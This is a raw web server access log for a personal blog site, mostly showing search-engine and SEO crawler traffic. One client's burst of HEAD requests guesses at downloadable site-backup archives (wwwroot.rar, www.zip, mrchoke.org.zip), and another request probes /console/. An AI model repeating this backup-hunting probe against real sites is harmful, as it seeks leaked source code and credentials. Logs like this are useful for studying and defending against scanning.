185.191.171.3 - - [30/Jun/2022:06:09:17 +0000] "GET /node/939/img_6371/ HTTP/1.1" 200 7908 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.26 - - [30/Jun/2022:06:09:19 +0000] "GET /node/category/music/page/8 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.15 - - [30/Jun/2022:06:09:20 +0000] "GET /node/category/music/page/8 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.45 - - [30/Jun/2022:06:09:23 +0000] "GET /node/category/music/page/8/ HTTP/1.1" 200 11178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.81 - - [30/Jun/2022:06:11:29 +0000] "GET /node/1006/img_6472?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/1006/img_6472?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:11:46 +0000] "GET /node/1006/img_6472?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/1006/img_6472?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:12:44 +0000] "GET /node/1006/img_6472?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/1006/img_6472?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:13:02 +0000] "GET /node/1006/img_6472?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/1006/img_6472?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:06:14:16 +0000] "GET /node/1006/img_6472?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/1006/img_6472?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
128.14.133.58 - - [30/Jun/2022:06:14:22 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
114.119.147.81 - - [30/Jun/2022:06:14:30 +0000] "GET /node/85?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/85" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:06:14:34 +0000] "GET /node/1006/img_6472?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/1006/img_6472?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:14:47 +0000] "GET /node/85?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/85" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [30/Jun/2022:06:15:50 +0000] "GET /node/1006/img_6472?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/1006/img_6472?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [30/Jun/2022:06:16:00 +0000] "GET /node/1006/img_6472?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/1006/img_6472?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:06:16:24 +0000] "GET /node/category/jigdo?ak_action=reject_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/category/jigdo" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:06:16:29 +0000] "GET /node/category/jigdo?ak_action=reject_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/category/jigdo" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:06:16:35 +0000] "GET /node/category/jigdo/?ak_action=reject_mobile HTTP/1.1" 200 9448 "https://mrchoke.org/node/category/jigdo" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.139.103 - - [30/Jun/2022:06:16:42 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible;PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
130.61.255.60 - - [30/Jun/2022:06:17:14 +0000] "GET /wp-content/uploads/2012/05/IMG_1724-150x150.jpg HTTP/1.1" 200 7201 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
51.222.253.13 - - [30/Jun/2022:06:17:23 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.81 - - [30/Jun/2022:06:19:42 +0000] "GET /node/1885/5 HTTP/1.1" 302 154 "https://mrchoke.org/node/date/2014/07" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:20:03 +0000] "GET /node/1885/5 HTTP/1.1" 301 178 "https://mrchoke.org/node/date/2014/07" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
35.233.62.116 - - [30/Jun/2022:06:21:09 +0000] "GET / HTTP/1.1" 200 396 "-" "python-requests/2.28.0"
114.119.147.75 - - [30/Jun/2022:06:21:31 +0000] "GET /node/date/2004/06/ HTTP/1.1" 302 154 "https://mrchoke.org/node/date/2004/06/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [30/Jun/2022:06:21:47 +0000] "GET /node/date/2004/06/ HTTP/1.1" 200 9970 "https://mrchoke.org/node/date/2004/06/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:21:59 +0000] "GET /node/1885/5 HTTP/1.1" 302 154 "https://mrchoke.org/node/date/2014/07" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.71.182 - - [30/Jun/2022:06:22:35 +0000] "GET /feed/?attachment_id=1516 HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.71.28 - - [30/Jun/2022:06:23:12 +0000] "GET /node/date/2006/09/page/2/ HTTP/1.1" 200 11390 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
114.119.147.74 - - [30/Jun/2022:06:23:52 +0000] "GET /img_7019 HTTP/1.1" 301 178 "https://mrchoke.org/node/1298?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:06:24:05 +0000] "GET /img_7019/ HTTP/1.1" 200 7912 "https://mrchoke.org/node/1298?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
2401:4900:5138:7883:1186:4ad2:b47a:c76f - - [30/Jun/2022:06:24:12 +0000] "GET /wp-content/uploads/2013/12/virtualbox_logo.png HTTP/2.0" 302 154 "https://www.sitepoint.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
2401:4900:5138:7883:1186:4ad2:b47a:c76f - - [30/Jun/2022:06:24:13 +0000] "GET /wp-content/uploads/2013/12/virtualbox_logo.png HTTP/2.0" 404 186 "https://www.sitepoint.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
114.119.147.73 - - [30/Jun/2022:06:25:16 +0000] "GET /node/939/img_6380 HTTP/1.1" 301 178 "https://mrchoke.org/node/939?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [30/Jun/2022:06:25:22 +0000] "GET /node/939/img_6380/ HTTP/1.1" 200 7892 "https://mrchoke.org/node/939?share=facebook" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.20 - - [30/Jun/2022:06:27:34 +0000] "GET /node/category/root/ HTTP/2.0" 200 9046 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
216.244.66.229 - - [30/Jun/2022:06:28:44 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [30/Jun/2022:06:28:45 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [30/Jun/2022:06:28:46 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.81 - - [30/Jun/2022:06:29:45 +0000] "GET /node/date/2007/01/17 HTTP/1.1" 301 178 "https://mrchoke.org/node/147?share=twitter" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:29:52 +0000] "GET /node/date/2007/01/17/ HTTP/1.1" 200 8617 "https://mrchoke.org/node/147?share=twitter" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [30/Jun/2022:06:31:55 +0000] "GET /node/153?share=reddit HTTP/1.1" 302 154 "https://mrchoke.org/node/153?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [30/Jun/2022:06:32:01 +0000] "GET /node/153?share=reddit HTTP/1.1" 301 178 "https://mrchoke.org/node/153?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [30/Jun/2022:06:32:10 +0000] "GET /node/153/?share=reddit HTTP/1.1" 200 8945 "https://mrchoke.org/node/153?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:06:33:43 +0000] "GET /node/tag/tu?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/tag/tu?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:06:33:49 +0000] "GET /node/tag/tu?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/tag/tu?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [30/Jun/2022:06:33:55 +0000] "GET /node/tag/tu/?ak_action=accept_mobile HTTP/1.1" 200 10496 "https://mrchoke.org/node/tag/tu?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [30/Jun/2022:06:34:00 +0000] "GET /node/355/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [30/Jun/2022:06:34:10 +0000] "GET /node/939/img_6435 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [30/Jun/2022:06:34:26 +0000] "GET /wp-content/uploads/2014/01/CH7_3183.jpg HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.74 - - [30/Jun/2022:06:36:24 +0000] "GET /node/180?share=facebook HTTP/1.1" 302 154 "https://mrchoke.org/node/180?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [30/Jun/2022:06:36:33 +0000] "GET /node/180?share=facebook HTTP/1.1" 301 178 "https://mrchoke.org/node/180?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.7.214.104 - - [30/Jun/2022:06:36:49 +0000] "GET /console/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
114.119.147.97 - - [30/Jun/2022:06:37:42 +0000] "GET /node/497?ak_action=reject_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/497?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [30/Jun/2022:06:37:46 +0000] "GET /node/497?ak_action=reject_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/497?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
51.222.253.14 - - [30/Jun/2022:06:37:46 +0000] "GET /node/date/2006/11/29/ HTTP/2.0" 200 8253 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.97 - - [30/Jun/2022:06:37:49 +0000] "GET /node/497/?ak_action=reject_mobile HTTP/1.1" 200 8343 "https://mrchoke.org/node/497?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:06:39:23 +0000] "GET /node/310 HTTP/1.1" 301 178 "https://mrchoke.org/node/353?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:06:39:27 +0000] "GET /node/310/ HTTP/1.1" 200 9476 "https://mrchoke.org/node/353?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [30/Jun/2022:06:39:44 +0000] "GET /gallery/?g2_itemId=2680 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.86 - - [30/Jun/2022:06:41:28 +0000] "GET /node/category/trip/page/3 HTTP/1.1" 302 154 "https://mrchoke.org/node/category/trip/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:06:41:33 +0000] "GET /node/category/trip/page/3 HTTP/1.1" 301 178 "https://mrchoke.org/node/category/trip/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [30/Jun/2022:06:41:38 +0000] "GET /node/category/trip/page/3/ HTTP/1.1" 200 15876 "https://mrchoke.org/node/category/trip/page/2" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:43:16 +0000] "GET /node/308?ak_action=reject_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/308?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:43:22 +0000] "GET /node/308?ak_action=reject_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/308?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:43:28 +0000] "GET /node/308/?ak_action=reject_mobile HTTP/1.1" 200 8352 "https://mrchoke.org/node/308?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.71.171 - - [30/Jun/2022:06:43:41 +0000] "GET /?p=1786 HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
148.153.98.52 - - [30/Jun/2022:06:43:54 +0000] "GET /robots.txt HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
148.153.98.52 - - [30/Jun/2022:06:43:54 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
148.153.98.52 - - [30/Jun/2022:06:43:54 +0000] "GET /test_404_page/ HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36"
148.153.98.52 - - [30/Jun/2022:06:44:35 +0000] "GET //favicon.ico HTTP/1.1" 404 134 "-" "python-requests/2.23.0"
114.119.147.81 - - [30/Jun/2022:06:45:17 +0000] "GET /node/1657/img_7632?share=facebook HTTP/1.1" 302 154 "http://mrchoke.org/node/1657/img_7632" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:45:25 +0000] "GET /node/1657/img_7632?share=facebook HTTP/1.1" 301 178 "http://mrchoke.org/node/1657/img_7632" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.81 - - [30/Jun/2022:06:45:35 +0000] "GET /node/1657/img_7632/?share=facebook HTTP/1.1" 200 7948 "http://mrchoke.org/node/1657/img_7632" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
45.207.39.117 - - [30/Jun/2022:06:46:59 +0000] "HEAD /wwwroot.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:46:59 +0000] "HEAD /wwwroot.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:46:59 +0000] "HEAD /\xD0\xC2\xBD\xA8\xCE\xC4\xBC\xFE\xBC\xD0.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:46:59 +0000] "HEAD /\xD0\xC2\xBD\xA8\xCE\xC4\xBC\xFE\xBC\xD0.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /www.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /www.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /web.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /web.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /mrchoke.org.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /mrchoke.org.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /mrchoke_org.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /mrchoke_org.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /mrchokeorg.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /mrchokeorg.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /mrchoke.org.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /mrchoke.org.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /mrchoke.rar HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
45.207.39.117 - - [30/Jun/2022:06:47:00 +0000] "HEAD /mrchoke.zip HTTP/1.1" 404 0 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"
207.46.13.149 - - [30/Jun/2022:06:47:10 +0000] "GET /feed/?attachment_id=1784 HTTP/2.0" 403 123 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
114.119.147.75 - - [30/Jun/2022:06:47:27 +0000] "GET /node/378?ak_action=reject_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/378" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [30/Jun/2022:06:47:42 +0000] "GET /node/378?ak_action=reject_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/378" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
40.77.167.43 - - [30/Jun/2022:06:48:29 +0000] "GET /node/234/feed HTTP/2.0" 301 178 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.4 - - [30/Jun/2022:06:48:32 +0000] "GET /node/date/2005/11/09/ HTTP/2.0" 200 8190 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
40.77.167.43 - - [30/Jun/2022:06:48:39 +0000] "GET /node/234/feed/ HTTP/2.0" 403 123 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
185.191.171.8 - - [30/Jun/2022:06:48:51 +0000] "GET /node/1510 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.8 - - [30/Jun/2022:06:48:53 +0000] "GET /node/1510/ HTTP/1.1" 200 9438 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
116.203.105.92 - - [30/Jun/2022:06:49:06 +0000] "GET /feed HTTP/1.1" 404 197 "-" "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; WOW64; Trident/6.0)"
